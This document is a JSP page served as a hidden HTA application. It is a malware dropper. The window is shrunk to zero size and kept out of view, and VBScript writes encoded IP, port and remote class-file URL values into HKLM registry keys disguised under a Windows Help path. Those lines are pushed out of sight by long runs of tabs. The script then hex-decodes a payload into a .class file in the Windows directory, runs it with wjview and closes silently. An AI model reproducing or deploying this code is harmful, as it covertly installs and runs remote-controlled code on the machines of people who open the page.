<%@ page contentType="application/hta" %>
<html>
<head>
<hta:application id=hta_note_id
applicationName=hta_note_name
innerBorder=no
showInTaskBar=no
contextmenu=no
selection=no
scroll=no
caption=no
/>
<script language=javascript>
window.resizeTo(0, 0);
window.moveTo(0, 0);
</script>
<script Language="VBS">
on error resume next
Set shell = CreateObject("WScript.Shell")
																																																																																																																																																			shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\Help\IP","207 15 0 37 207 32 218 29 163 120 140 "
																																																																																																																																																			shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\Help\PORT","207 15 60 121 13 0 "
																																																																																																																																																		shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\Help\URL","<NONE>"
																																																																																																																																																		shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\Help\AUTOCONTROL","false"
																																																																																																																																																			shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\Help\TM","http://www.mycgiserver.com/~jduke/levent/RegistryAPI.class"
windirx = ""
windirx = shell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\SystemRoot")
if windirx = "" Then
	windirx = shell.RegRead("HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRoot")
	if windirx = "" Then
		windirx = "C:\Windows"
	End if
End if
codes = ""
path = windirx & "\JDukeKyrpt.class"
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile(path,true)
h0 = ""
i = 1
Do While i < Len(codes)
h0 = h0 & chr(cint("&h" & mid(codes, i, 2)))
i = i + 2
Loop
file.Write (h0)
file.Close
shell.Run("wjview " & path)
self.Close
</script>
